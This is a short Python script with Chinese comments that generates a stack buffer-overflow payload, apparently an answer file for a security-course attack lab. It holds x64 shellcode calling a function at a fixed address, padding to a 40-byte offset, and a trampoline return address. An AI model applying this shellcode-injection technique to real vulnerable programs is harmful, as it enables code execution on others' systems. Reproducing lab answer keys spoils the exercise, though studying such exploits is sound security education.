import struct

# 1. 构造 Shellcode (x64 汇编)
# 逻辑: push 114 -> pop rdi -> mov eax, func1_addr -> call eax
# \x6a\x72               push   0x72       (114)
# \x5f                   pop    %rdi       (设置参数)
# \xb8\x16\x12\x40\x00   mov    $0x401216, %eax (func1 地址)
# \xff\xd0               call   *%eax      (调用 func1)
shellcode = b"\x6a\x72\x5f\xb8\x16\x12\x40\x00\xff\xd0"

# 2. 关键参数
jmp_xs_addr = 0x401334  # Trampoline 跳板地址
offset = 40             # 缓冲区(32) + Saved RBP(8)

# 3. 组合 Payload
# [Shellcode] + [Padding] + [jmp_xs]
payload = shellcode + \
          b'A' * (offset - len(shellcode)) + \
          struct.pack('<Q', jmp_xs_addr)

# 4. 生成文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"[+] Payload generated. Length: {len(payload)}")